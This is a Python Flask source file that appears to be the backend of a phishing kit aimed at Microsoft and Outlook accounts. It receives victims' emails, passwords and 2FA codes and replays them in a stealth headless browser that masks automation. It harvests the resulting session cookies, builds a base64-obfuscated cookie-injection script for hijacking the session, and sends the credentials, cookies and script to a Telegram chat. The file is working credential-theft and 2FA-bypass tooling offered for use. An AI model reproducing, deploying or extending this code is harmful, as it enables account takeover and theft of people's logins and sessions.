import os
import time
import random
import json
import base64
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from playwright.sync_api import sync_playwright

app = Flask(__name__)
CORS(app)

# ========== ENVIRONMENT VARIABLES ==========
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    raise RuntimeError("Telegram credentials missing")

MICROSOFT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&prompt=select_account"

# ========== HELPER: RANDOM DELAY ==========
def human_delay():
    time.sleep(random.uniform(1.5, 3.5))

# ========== PLAYWRIGHT LOGIN WITH STEALTH AND TIMEOUTS ==========
def attempt_login(email, password, totp_code=None):
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process'
            ]
        )
        context = browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        try:
            # Go to Microsoft login
            page.goto(MICROSOFT_URL, wait_until="networkidle", timeout=60000)
            human_delay()

            # Email
            email_input = page.locator('input[type="email"], input[name="loginfmt"]').first
            email_input.fill(email)
            page.locator('button:has-text("Next"), input[type="submit"]').first.click()
            page.wait_for_load_state("networkidle", timeout=60000)
            human_delay()

            # Password
            pwd_input = page.locator('input[type="password"]').first
            pwd_input.fill(password)
            page.locator('button:has-text("Sign in"), input[type="submit"]').first.click()
            page.wait_for_load_state("networkidle", timeout=60000)
            human_delay()

            # Check for 2FA field
            totp_input = page.locator('input[name="otc"], input[id="idChlgBc"], input[placeholder*="code"]').first
            if totp_input.count():
                if totp_code:
                    totp_input.fill(totp_code)
                    page.locator('button:has-text("Verify"), input[type="submit"]').first.click()
                    page.wait_for_load_state("networkidle", timeout=60000)
                    human_delay()
                else:
                    return (None, "2fa_required")

            # Wait for final redirect to Outlook (or success page)
            page.wait_for_url(lambda url: "outlook.live.com" in url, timeout=60000)

            # Final delay before capturing cookies
            human_delay()

            cookies = context.cookies()
            return (cookies, None)
        except Exception as e:
            # Save a screenshot for debugging (optional)
            try:
                page.screenshot(path="error_screenshot.png")
            except:
                pass
            return (None, str(e))
        finally:
            browser.close()

# ========== TELEGRAM SENDER ==========
def generate_injection_script(cookies, target_url="https://login.microsoftonline.com"):
    script = f"""!function(){{
    let e = {json.dumps(cookies)};
    for(let o of e) {{
        let maxAge = o.expirationDate ? Math.floor(o.expirationDate - Date.now()/1000) : 31536000;
        let cookieStr = `${{o.name}}=${{o.value}}; Max-Age=${{maxAge}}; path=${{o.path || '/'}}; domain=${{o.domain}}; ${{o.secure ? 'Secure' : ''}}; SameSite=${{o.sameSite || 'Lax'}}`;
        document.cookie = cookieStr;
    }}
    window.location.href = atob('{base64.b64encode(target_url.encode()).decode()}');
}}();"""
    return script

def send_to_telegram(email, password, cookies):
    cookies_str = json.dumps(cookies, indent=2)
    if len(cookies_str) > 2000:
        cookies_str = cookies_str[:2000] + "\n... (truncated)"
    injection_script = generate_injection_script(cookies)
    message = (
        f"✅ **Microsoft Login Success**\n"
        f"📧 **Email:** `{email}`\n"
        f"🔑 **Password:** `{password}`\n\n"
        f"🍪 **Cookies (JSON):**\n```json\n{cookies_str}\n```\n\n"
        f"💉 **Injection Script:**\n```javascript\n{injection_script}\n```"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=15)
        print("Telegram sent")
    except Exception as e:
        print(f"Telegram error: {e}")

# ========== FLASK ENDPOINTS ==========
@app.route("/login/step1", methods=["POST"])
def login_step1():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    cookies, err = attempt_login(email, password)
    if cookies:
        send_to_telegram(email, password, cookies)
        return jsonify({"status": "success", "message": "No 2FA needed, sent to Telegram"})
    elif err == "2fa_required":
        return jsonify({"status": "2fa_required"})
    else:
        return jsonify({"status": "error", "error": err}), 400

@app.route("/login/step2", methods=["POST"])
def login_step2():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    totp = data.get("totp")
    if not email or not password or not totp:
        return jsonify({"error": "Missing email, password, or TOTP"}), 400

    cookies, err = attempt_login(email, password, totp)
    if cookies:
        send_to_telegram(email, password, cookies)
        return jsonify({"status": "success", "message": "2FA completed, sent to Telegram"})
    else:
        return jsonify({"status": "error", "error": err}), 400

@app.route("/health", methods=["GET"])
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
